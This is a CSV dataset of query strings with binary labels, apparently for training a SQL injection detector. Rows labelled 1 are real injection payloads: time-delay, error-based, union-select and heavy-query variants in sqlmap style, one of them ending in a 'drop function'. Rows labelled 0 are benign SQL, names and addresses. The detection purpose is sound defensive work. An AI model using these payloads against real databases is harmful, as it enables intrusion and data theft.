query,label
1' and sleep  (  5  )   and 'kapr'  =  'kapr,1
select option_value from wp_options where option_name  =  'sm_on_fly' limit 1,0
select avg ( feel ) from its select sum ( city ),0
de arce millares,0
"1""  )   as kbjt where 2012  =  2012 and   (  5978  =  6898  )  *6898--",1
select * from tried where women = 'bag'  or play = 'jack',0
"-1956""  )   where 1448  =  1448 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
"escritor nicolas del paso, 95",0
5123,0
"1 where 1096  =  1096 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
1'  )   where 6624  =  6624 and 5392  =  8258,1
"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",1
"1""  )   as zopq where 2680  =  2680",1
"1' union all select null,null,null,null,null,null,null#",1
select count ( rain )  from question,0
1'||  (  select 'hbho' from dual where 7193  =  7193,1
1 where 5080  =  5080,1
select bean ( s )  from announced select imagine ( s ),0
"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""ghdr"" like ""ghdr",1
"1%""  )   and make_set  (  9956  =  1060,1060  )   and   (  ""%""  =  """,1
select * from battery_status where created_at > '2023-01-01' or updated_at > '2023-01-01',0
select ever ( s )  from saved select differ from present,0
"select * from whom order by clearly, element",0
select * from stone fetch first 50 percent rows only,0
"select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1
select dear from famous union select equipment from power order by hurry,0
"1' where 8437  =  8437 and make_set  (  8403  =  8403,8899  )  --",1
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ),1
"pont de bar, el",0
"select * from equipment order by rhythm, least",0
22468230j,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",1
"-4798%'   )    )     )   union all select 3330,3330,3330#",1
select option_value from wp_options where option_name  =  'zcf_captcha_settings' limit 1,0
piero,0
"-8065""   )    )     )   order by 1--",1
select count ( thirty ) from bar,0
i4sacular,0
"1' in boolean mode  )   union all select null,null,null,null,null#",1
"select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1
"-3707""   )    )     )   or 8571  =  8571--",1
gullera,0
"c/ ricardo gutierrez 26, 8-d",0
1'  )   where 2120  =  2120,1
"select * from shaking where them in  ( 'prevent', 'coach', 'writer' )",0
64462042b,0
"1 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
select * from wide where upward not like '[deep]%',0
1'+  (  select 'feof' where 1966  =  1966,1
cibeles,0
select * from business where shelter not like 'feathers%',0
dec4mas8xt6,0
select avg ( till ) from practical,0
terraje,0
"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
update atmosphere set quiet = 'chart'where movie = 'speech',0
select * from add where ability between '1996-07-01' and '1996-07-31',0
"-6419 union all select 7008,7008,7008,7008,7008--",1
"1"" or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
select observe ( s from high right join,0
"1  )   as yduh where 6481  =  6481 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
select * from winter,0
echecopar torrella,0
select * from clay fetch first 50 percent rows only,0
select top 3 * from night,0
select avg ( begun ) from low,0
end--,1
(  select   (  case when   (  7018  =  7018  )   then 7018 else 7018*  (  select 7018 from master..sysdatabases  )   end   )    ),1
"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # kfza",1
"1'||  (  select 'asfl' from dual where 5846  =  5846 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
firat6,0
"-1368   )    )    union all select 1310,1310,1310,1310,1310#",1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""zzmn""  =  ""zzmn",1
select * from mean where market like '%explore%',0
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'ulkq'  =  'ulkq,1
"1""   )    )    as dcrk where 5164  =  5164 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
select option_value from wp_options where option_name  =  'options_youtube_url' limit 1,0
select * from win fetch first 3 rows only select top 50 percent * from cut,0
-8753  )   order by 1#,1
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5fc54784b64dd' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",0
casacuberta delacerda,0
or a  =  a--,1
"select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1
marcanti,0
select min ( keep )  as thy from zulu,0
serville9,0
1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,1
"1""   )    )    as swix where 2459  =  2459 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
select top 3 * from gain,0
pl. herrera de los navarros 68 12-h,0
*/*,1
-2429%' or 6890  =  5846,1
select top 3 * from supply select * from dangerous 3select * from lady,0
salicilato,0
"1%"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,1
"1""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1 where 2751  =  2751 union all select null,null,null,null--",1
1' where 4134  =  4134 and 1102  =  6300--,1
"c/ veinat de cerdanyola, 3 6e",0
59760678p,0
if  (  3490  =  4920  )   select 3490 else drop function hlzt--,1
select count ( possibly )  from rose,0
"select employees.herd, count ( orders.earlyid )  as stoppedfrom    ( ordersinner join symbol on orders.cornerid  =  employees.spreadid )",0
feix ablitas,0
select avg ( growth ) from apple select sum ( rule ),0
cela uba,0
"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'oacz'  =  'oacz",1
select top 3 * from major select * from water 3select * from card,0
-1300  )   as rrsm where 1086  =  1086 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
select television ( s )  from bill select transportation ( s ),0
select avg ( consist ) from getting select sum ( pen ),0
ombra,0
"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,1
select simple ( s ) from court inner join,0
"1'  )   as hvyx where 3194  =  3194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
gusta mont,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ||'",1
"1  )   where 5234  =  5234 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
select min ( measure )  as apple from dropped,0
from  ( select distinct mountain from uncle ),0
1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,1
illano,0
"select * from show order by fellow asc, wall desc",0
"-5925  )   where 5758  =  5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",1
mald,0
"1,  (  select   (  case when   (  8392  =  8404  )   then 1 else 8392*  (  select 8392 from information_schema.character_sets  )   end   )    )",1
1.52494e+15,0
"waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",1
select * from amount where but = 'greater' fetch first 3 rows only,0
"select thank, settle, gift from community where stranger  is null",0
select * from dozen  where screen not like '[combination]%',0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  '%'  =  '",1
lindt38,0
71404358f,0
"calle platerias, 47",0
select * from salmon where skill between '1996-07-01' and '1996-07-31',0
qui0g6n16si2o,0
roe,0
select * from sheep,0
select * from users where id  =  '1' or \<$ or 1  =  1 -- 1',1
select support ( s )  from new full outer join,0
select * into newtable from oldtable where 1  =  0;,0
"1""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""fcpm""  =  ""fcpm",1
select * from five 3,0
santamarina,0
select * from straw where officer between official09/01/1996since and getting15/31/1996fell,0
"1""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""pdsy"" like ""pdsy",1
select top 50 percent * from lot,0
select count ( nearly ) from range,0
"select * from should where electricity between ""greater"" and    ""impossible""",0
select * from pool where relationship  between 10 and 20,0
"select rod, create, seldomfrom happily where idea  is not null",0
"-2500'   )    )     )   union all select 6853,6853,6853,6853--",1
1%'   )    )     )   and 7219  =  7361 and    (    (     (  '%'  =  ',1
"1"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )",1
quiles,0
1'+  (  select naiw where 4924  =  4924,1
"-3278'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'zxig' like 'zxig",1
end-- podi,1
"select count ( acres ) , corner from orbit by drive",0
retinte,0
shangtia,0
"select somewhere,list,up from log left join orders on income.pieid =  later.disappear order by summer.coast",0
"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",1
malcocinado,0
select * from manner  where belt not like '[written]%',0
"1   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1'||  (  select 'lstx' from dual where 2972  =  2972 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",1
select cot ( 6 ) ;,0
"update directly set kept =  'sold', city =  'out' where fell =  baby",0
1   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   4279  =  4279,1
select * from felt where cloud = 'tower' limit 3,0
"1"" union all select null#",1
select number ( s )  from here full outer join,0
cegajoso,0
"1""  )   where 9447  =  9447",1
select * from clear where exciting not like '[slept]%',0
"lugar higuera canaria, 169",0
1   )    )    as wwys where 9248  =  9248,1
select count ( fall ) from gift,0
"antelo y mario, 192,",0
focas@programaciones.com.sz,0
1  )   as hggi where 6511  =  6511,1
"and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  table_name  )   from   (  select distinct  (  table_name  )  , rownum as limit from sys.all_tables  )   where limit  =  4   )    )    and 'i'  =  'i",1
1'  )   where 2808  =  2808,1
select * from appearance where every = 'exercise',0
select * from crew order by group desc,0
select min ( nice )  as smile from zoo,0
select avg ( price ) from upward,0
select column_name from table1 union all,0
1' and 2316  =  7236,1
coderch gordo,0
select * from cream,0
"select maketime ( 11, 35,   4 ) ;",0
85624451m,0
hartzenbusch 98,0
"update complex set cover =  'union', city =  'catch' where more =  see",0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  3044  =  3044",1
select * from catch where instrument between '1996-07-01' and '1996-07-31',0
"1   )    )    as xvyi where 6701  =  6701 union all select null,null,null,null#",1
